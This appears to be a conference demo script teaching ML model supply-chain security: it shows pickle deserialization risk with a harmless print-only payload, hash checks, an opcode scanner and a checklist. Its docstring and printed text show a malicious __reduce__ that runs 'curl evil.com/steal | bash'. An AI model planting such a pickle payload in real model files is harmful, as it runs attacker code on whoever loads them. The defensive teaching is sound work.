#!/usr/bin/env python3
"""
DEMO 05: Supply Chain Security - Model Integrity Verification
=============================================================
SCALE 23x - Red Teaming the Robot

Demonstrates supply chain risks when downloading models and
shows how to verify model integrity before loading.

Run: python demos/05_supply_chain_check.py
"""

import sys
import os
import time
import hashlib
import struct
import json
import tempfile
import pickle
import argparse
from pathlib import Path

sys.path.insert(0, "vulnerable_app")
from anthropic_chatbot import presenter_pause

# ─── Terminal Colors ─────────────────────────────────────────────────
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"


def section(title):
    print(f"\n{CYAN}{'─' * 60}{RESET}")
    print(f"{CYAN}{BOLD}  {title}{RESET}")
    print(f"{CYAN}{'─' * 60}{RESET}\n")


def info(msg):
    print(f"  {GREEN}[INFO]{RESET} {msg}")


def warn(msg):
    print(f"  {YELLOW}[WARN]{RESET} {msg}")


def danger(msg):
    print(f"  {RED}[DANGER]{RESET} {msg}")


def ok(msg):
    print(f"  {GREEN}[OK]{RESET} {msg}")


# ═══════════════════════════════════════════════════════════════════════
# DEMO 1: Pickle Deserialization Attack
# ═══════════════════════════════════════════════════════════════════════

def demo_pickle_danger():
    """Demonstrate why pickle files are dangerous."""

    section("PART 1: The Pickle Problem")

    print(f"""  {DIM}When you download a model from Hugging Face, many are stored as
  pickle (.pkl, .bin, .pt) files. Pickle can execute arbitrary
  Python code during deserialization.{RESET}
""")

    # Create a simulated malicious pickle
    info("Creating simulated malicious pickle file...")

    class SimulatedMaliciousPayload:
        """
        In a real attack, __reduce__ would return:
          (os.system, ("curl evil.com/steal.sh | bash",))

        This is a SAFE SIMULATION that just prints a message.
        """
        def __reduce__(self):
            return (print, ("[SIMULATED] Malicious code would execute here!",))

    with tempfile.NamedTemporaryFile(suffix=".pkl", delete=False) as f:
        pickle.dump(SimulatedMaliciousPayload(), f)
        malicious_path = f.name

    danger(f"Malicious pickle created: {malicious_path}")
    print()

    # Show the attack code
    print(f"  {RED}What a real malicious model looks like:{RESET}")
    print(f"""
  {DIM}class MaliciousModel:
      def __reduce__(self):
          # This code runs when pickle.load() is called
          return (os.system, ("curl evil.com/steal | bash",))

  # Attacker uploads this as "helpful-model-v2.bin"
  pickle.dump(MaliciousModel(), open("model.bin", "wb"))

  # Victim downloads and loads it:
  model = pickle.load(open("model.bin", "rb"))  # PWNED{RESET}
""")

    # Demonstrate the simulation
    warn("Loading the simulated malicious pickle...")
    result = pickle.load(open(malicious_path, "rb"))
    danger("^ Code executed during deserialization - no model.forward() needed!")
    print()

    # Clean up
    os.unlink(malicious_path)

    # Show the safe alternative
    ok("SAFE ALTERNATIVE: Use safetensors format")
    print(f"""
  {GREEN}from safetensors.torch import load_file

  # safetensors only stores tensor data - NO code execution
  weights = load_file("model.safetensors")  # SAFE{RESET}
""")


# ═══════════════════════════════════════════════════════════════════════
# DEMO 2: Hash Verification
# ═══════════════════════════════════════════════════════════════════════

def demo_hash_verification():
    """Demonstrate model hash verification."""

    section("PART 2: Hash Verification")

    print(f"  {DIM}Always verify model file integrity before loading.{RESET}\n")

    # Create a simulated model file
    with tempfile.NamedTemporaryFile(suffix=".safetensors", delete=False) as f:
        # Write some fake model data
        model_data = b"SIMULATED_MODEL_WEIGHTS_" + os.urandom(1024)
        f.write(model_data)
        model_path = f.name

    # Calculate hash
    sha256 = hashlib.sha256(model_data).hexdigest()
    info(f"Model file: {model_path}")
    info(f"SHA-256: {sha256}")
    print()

    # Verify hash (success case)
    info("Verification: Checking hash...")
    verify_hash = hashlib.sha256(open(model_path, "rb").read()).hexdigest()
    if verify_hash == sha256:
        ok(f"Hash matches! Model integrity verified.")
    else:
        danger("Hash mismatch! Model may be tampered!")
    print()

    # Simulate tampering
    warn("Simulating model tampering...")
    with open(model_path, "r+b") as f:
        f.seek(10)
        f.write(b"TAMPERED")

    tampered_hash = hashlib.sha256(open(model_path, "rb").read()).hexdigest()
    danger(f"Tampered hash: {tampered_hash}")

    if tampered_hash != sha256:
        danger(f"HASH MISMATCH DETECTED!")
        danger(f"  Expected: {sha256[:32]}...")
        danger(f"  Got:      {tampered_hash[:32]}...")
        danger(f"  Model has been TAMPERED with!")
    print()

    os.unlink(model_path)

    # Show the verification workflow
    print(f"  {GREEN}Verification workflow:{RESET}")
    print(f"""
  {DIM}import hashlib
  from huggingface_hub import hf_hub_download, model_info

  # 1. Get expected hash from model card
  info = model_info("meta-llama/Llama-3-8B")

  # 2. Download model file
  path = hf_hub_download("meta-llama/Llama-3-8B", "model.safetensors")

  # 3. Verify hash
  actual = hashlib.sha256(open(path, "rb").read()).hexdigest()
  expected = info.siblings[0].sha256  # from model card

  assert actual == expected, "MODEL INTEGRITY COMPROMISED!"{RESET}
""")


# ═══════════════════════════════════════════════════════════════════════
# DEMO 3: Pickle Scanner
# ═══════════════════════════════════════════════════════════════════════

def demo_pickle_scanner():
    """Demonstrate scanning pickle files for dangerous operations."""

    section("PART 3: Scanning for Malicious Pickles")

    # Dangerous opcodes to look for
    DANGEROUS_OPS = {
        b'c': "GLOBAL - imports a module (can import os, subprocess, etc.)",
        b'\x8c': "SHORT_BINUNICODE - may reference dangerous module names",
        b'R': "REDUCE - calls a function (the actual code execution trigger)",
        b'o': "OBJ - creates an object",
        b'i': "INST - creates an instance",
    }

    # Create test files
    info("Creating test pickle files...\n")

    # Safe pickle (just data)
    safe_data = {"weights": [1.0, 2.0, 3.0], "bias": [0.1]}
    with tempfile.NamedTemporaryFile(suffix=".pkl", delete=False) as f:
        pickle.dump(safe_data, f)
        safe_path = f.name

    # Suspicious pickle (has REDUCE opcode)
    class SuspiciousModel:
        def __reduce__(self):
            return (print, ("simulated",))

    with tempfile.NamedTemporaryFile(suffix=".pkl", delete=False) as f:
        pickle.dump(SuspiciousModel(), f)
        suspicious_path = f.name

    def scan_pickle(filepath):
        """Simple pickle scanner - checks for dangerous opcodes."""
        findings = []
        with open(filepath, "rb") as f:
            data = f.read()

        # Check for dangerous opcode patterns
        for op, description in DANGEROUS_OPS.items():
            count = data.count(op)
            if count > 0:
                # Check if it's in a suspicious context
                for i, pos in enumerate(range(len(data))):
                    if data[pos:pos + len(op)] == op:
                        context = data[max(0, pos - 10):pos + 20]
                        # Look for dangerous module references near the opcode
                        dangerous_modules = [b"os", b"subprocess", b"sys", b"exec", b"eval", b"builtins"]
                        for mod in dangerous_modules:
                            if mod in context:
                                findings.append({
                                    "opcode": op.hex(),
                                    "description": description,
                                    "context": f"References '{mod.decode()}' module",
                                    "severity": "CRITICAL",
                                    "position": pos,
                                })
                                break
                        if not findings or findings[-1]["position"] != pos:
                            if op == b'R':  # REDUCE is always suspicious
                                findings.append({
                                    "opcode": op.hex(),
                                    "description": description,
                                    "context": "Function call opcode detected",
                                    "severity": "HIGH",
                                    "position": pos,
                                })
                        break  # Only report first occurrence

        return findings

    # Scan safe file
    print(f"  {CYAN}Scanning: {os.path.basename(safe_path)} (safe data){RESET}")
    safe_findings = scan_pickle(safe_path)
    if not safe_findings:
        ok("No dangerous patterns found - SAFE")
    else:
        for f in safe_findings:
            warn(f"  [{f['severity']}] {f['description']}: {f['context']}")
    print()

    # Scan suspicious file
    print(f"  {CYAN}Scanning: {os.path.basename(suspicious_path)} (suspicious model){RESET}")
    sus_findings = scan_pickle(suspicious_path)
    if not sus_findings:
        ok("No dangerous patterns found")
    else:
        for f in sus_findings:
            danger(f"  [{f['severity']}] {f['description']}: {f['context']}")
    print()

    # Clean up
    os.unlink(safe_path)
    os.unlink(suspicious_path)

    # Show picklescan tool
    info("For production, use the dedicated picklescan tool:")
    print(f"""
  {DIM}pip install picklescan

  # Scan a single file
  picklescan --path model.bin

  # Scan an entire model directory
  picklescan --path ./my-model/

  # Scan before downloading from Hugging Face
  picklescan --huggingface user/model-name{RESET}
""")


# ═══════════════════════════════════════════════════════════════════════
# DEMO 4: Supply Chain Checklist
# ═══════════════════════════════════════════════════════════════════════

def demo_checklist():
    """Show the complete supply chain security checklist."""

    section("SUPPLY CHAIN SECURITY CHECKLIST")

    checklist = [
        ("Use safetensors format",
         "Never load raw pickle. Convert existing models with:\n"
         "    from safetensors.torch import save_file"),
        ("Verify SHA-256 hashes",
         "Compare file hash against published values before loading"),
        ("Pin model versions",
         "Never use 'latest'. Pin to specific commit SHA:\n"
         '    model = AutoModel.from_pretrained("org/model", revision="abc123")'),
        ("Run picklescan",
         "Scan all model files before loading:\n"
         "    picklescan --path ./model-directory/"),
        ("Sandbox model loading",
         "Run in containers with no network egress:\n"
         "    docker run --network=none model-loader"),
        ("Audit model sources",
         "Check Hugging Face model cards, community flags,\n"
         "    download counts, and organization verification"),
        ("Use private model registry",
         "Mirror approved models internally. Don't pull directly\n"
         "    from public repos in production"),
        ("Monitor for model drift",
         "Hash-check models periodically in production.\n"
         "    Alert if weights change unexpectedly"),
    ]

    for i, (title, detail) in enumerate(checklist, 1):
        print(f"  {GREEN}{BOLD}{i}.{RESET} {BOLD}{title}{RESET}")
        print(f"     {DIM}{detail}{RESET}")
        print()


def main():
    parser = argparse.ArgumentParser(
        description="Demo 05: Supply Chain Security — Model Integrity Verification"
    )
    parser.add_argument(
        "--pause", action="store_true",
        help="Pause between sections for live presentation"
    )
    args = parser.parse_args()
    pause = args.pause

    print(f"""
{YELLOW}{BOLD}
  ╔═══════════════════════════════════════════════════════════╗
  ║          SUPPLY CHAIN SECURITY                           ║
  ║          Red Teaming the Robot - SCALE 23x               ║
  ╚═══════════════════════════════════════════════════════════╝
{RESET}""")

    print(f"""  {DIM}The model you download might not be the model you think it is.
  Pickle files can execute arbitrary code. Model weights can be
  backdoored. And most teams have zero verification in place.{RESET}
""")

    demo_pickle_danger()
    presenter_pause("Hash Verification — detecting tampered models", enabled=pause)
    demo_hash_verification()
    presenter_pause("Pickle Scanner — automated security scanning", enabled=pause)
    demo_pickle_scanner()
    presenter_pause("Supply Chain Security Checklist", enabled=pause)
    demo_checklist()

    print(f"""
{CYAN}
  ┌─────────────────────────────────────────────────────────────┐
  │  KEY TAKEAWAY: Treat model files like software dependencies │
  │                                                             │
  │  You wouldn't run `npm install random-package` without      │
  │  checking it. Don't do the same with model weights.         │
  │                                                             │
  │  - Use safetensors, not pickle                              │
  │  - Hash verify everything                                   │
  │  - Scan before loading                                      │
  │  - Sandbox model inference                                  │
  └─────────────────────────────────────────────────────────────┘
{RESET}""")


if __name__ == "__main__":
    main()
